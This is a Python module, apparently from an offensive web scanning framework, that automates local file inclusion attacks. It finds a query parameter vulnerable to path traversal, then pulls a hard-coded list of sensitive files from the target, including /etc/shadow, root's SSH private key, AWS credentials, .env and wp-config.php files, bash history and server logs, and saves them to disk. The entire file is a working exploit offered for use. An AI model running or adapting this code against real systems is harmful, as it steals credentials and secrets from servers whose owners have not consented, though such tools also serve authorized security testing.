"""lfi_dump — extract files via LFI with auto-save"""
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from pathlib import Path

FILES = [
    "/etc/passwd","/etc/shadow","/etc/hosts","/etc/hostname",
    "/proc/self/environ","/proc/self/cmdline","/proc/self/status",
    "/proc/version","/proc/cpuinfo","/proc/meminfo",
    "/root/.bash_history","/root/.ssh/id_rsa","/root/.aws/credentials",
    "/var/log/apache2/access.log","/var/log/apache2/error.log",
    "/var/log/nginx/access.log","/var/log/nginx/error.log",
    "/var/log/auth.log","/var/log/syslog",
    "/var/www/html/.env","/var/www/html/wp-config.php","/var/www/html/config.php",
]

TRAVERSAL = "../../../../.."

class LfiDump:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        u = urlparse(target)
        params = parse_qs(u.query) or {"file": ["index"]}

        out_dir = Path("reports") / "dump" / "lfi"
        out_dir.mkdir(parents=True, exist_ok=True)

        # find vulnerable param
        param = None
        for name in params:
            test = f"{TRAVERSAL}/etc/passwd"
            q = dict(params); q[name] = [test]
            url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
            r = http.get(url)
            if r and "root:x:0:0" in r.text:
                param = name
                break
        if not param:
            print("[lfi_dump] no injectable param"); return {}

        print(f"[lfi_dump] vulnerable: {param}")
        dumped = {}
        for f in FILES:
            test = f"{TRAVERSAL}{f}"
            q = dict(params); q[param] = [test]
            url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
            r = http.get(url)
            if not r: continue
            # check if likely a file (not error page)
            if len(r.content) < 20 or "not found" in r.text.lower()[:200]: continue
            # extract interesting content
            body = r.text
            # try to find file content between common markers
            m = re.search(r"(root:x:0:0[^\n]*)", body)
            if m or "/bin/" in body or "HOME=" in body or "BEGIN RSA" in body:
                fname = f.replace("/", "_")
                (out_dir / fname).write_text(body[:50000])
                dumped[f] = len(body)
                print(f"  [+] {f} -> {len(body)}b")
                logger.finding("lfi_dump", "critical", f"{f} ({len(body)} bytes)")

        print(f"[lfi_dump] {len(dumped)} files saved to {out_dir}")
        return {"dumped": list(dumped.keys())}
